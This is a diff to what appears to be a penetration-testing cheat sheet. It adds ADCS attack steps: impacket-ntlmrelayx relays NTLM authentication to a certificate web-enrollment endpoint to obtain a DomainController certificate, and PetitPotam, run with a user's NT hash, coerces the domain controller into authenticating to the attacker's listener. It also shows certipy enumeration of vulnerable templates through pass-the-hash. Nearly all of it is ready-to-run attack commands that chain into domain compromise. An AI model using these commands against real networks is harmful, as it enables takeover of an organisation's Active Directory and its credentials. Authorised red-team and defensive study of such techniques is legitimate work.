@@ -652,7 +652,7 @@ user enum sid:
   
 ## ADCS
   
-Find ADCS instance (need creds) :
+#### Find ADCS instance (need creds) :
   
 ```
 certipy find -u <user> -hashes <:hashNT> -dc-ip <IP>
@@ -662,6 +662,16 @@ then cat the vulnerable certificates :
 ```
 cat xxxxxxx_Certipy.txt | grep Vulnerabilities -A 1 -B 32
 ```
-  
 
+#### Start Listener on our Machine with the vulnerable certificate
+
+```
+impacket-ntlmrelayx -t http://<IpADCSServer>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
+  
+#### Trigger authentication of the DC with PetitPotam
+
+```
+python3 PetitPotam.py -u <user> -hashes <:hashNT> -d <domain> -dc-ip <ip> <ipLISTENER> <ipTARGET>
+```
   
